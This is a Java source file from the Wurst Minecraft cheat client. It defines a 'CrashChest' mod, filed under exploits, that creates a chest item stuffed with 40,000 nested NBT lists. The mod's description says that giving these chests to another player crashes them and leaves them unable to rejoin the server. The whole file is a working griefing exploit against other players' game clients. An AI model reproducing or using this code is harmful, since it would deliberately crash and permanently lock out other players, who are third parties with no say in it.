/*
 * Copyright � 2014 - 2016 | Wurst-Imperium | All rights reserved.
 * 
 * This Source Code Form is subject to the terms of the Mozilla Public
 * License, v. 2.0. If a copy of the MPL was not distributed with this
 * file, You can obtain one at http://mozilla.org/MPL/2.0/.
 */
package tk.wurst_client.mods;

import net.minecraft.init.Blocks;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;

@Mod.Info(category = Mod.Category.EXPLOITS,
	description = "Generates a CrashChest. Give a lot of these to another\n"
		+ "player to make them crash. They will not be able to join the server\n"
		+ "ever again!",
	name = "CrashChest",
	tags = "crash chest",
	tutorial = "Mods/CrashChest")
public class CrashChestMod extends Mod
{
	@Override
	public void onEnable()
	{
		if(mc.thePlayer.inventory.getStackInSlot(36) != null)
		{
			if(mc.thePlayer.inventory.getStackInSlot(36).getDisplayName()
				.equals("�6�lCOPY ME"))
				wurst.chat.error("You already have a CrashChest.");
			else
				wurst.chat.error("Please take off your shoes.");
			setEnabled(false);
			return;
		}else if(!mc.thePlayer.capabilities.isCreativeMode)
		{
			wurst.chat.error("Creative mode only.");
			setEnabled(false);
			return;
		}
		ItemStack stack = new ItemStack(Blocks.chest);
		NBTTagCompound nbtTagCompound = new NBTTagCompound();
		NBTTagList nbtList = new NBTTagList();
		for(int i = 0; i < 40000; i++)
			nbtList.appendTag(new NBTTagList());
		nbtTagCompound.setTag("www.wurst-client.tk", nbtList);
		stack.setTagInfo("www.wurst-client.tk", nbtTagCompound);
		mc.thePlayer.getInventory()[0] = stack;
		stack.setStackDisplayName("�6�lCOPY ME");
		wurst.chat.message("A CrashChest was placed in your shoes slot.");
		setEnabled(false);
	}
}
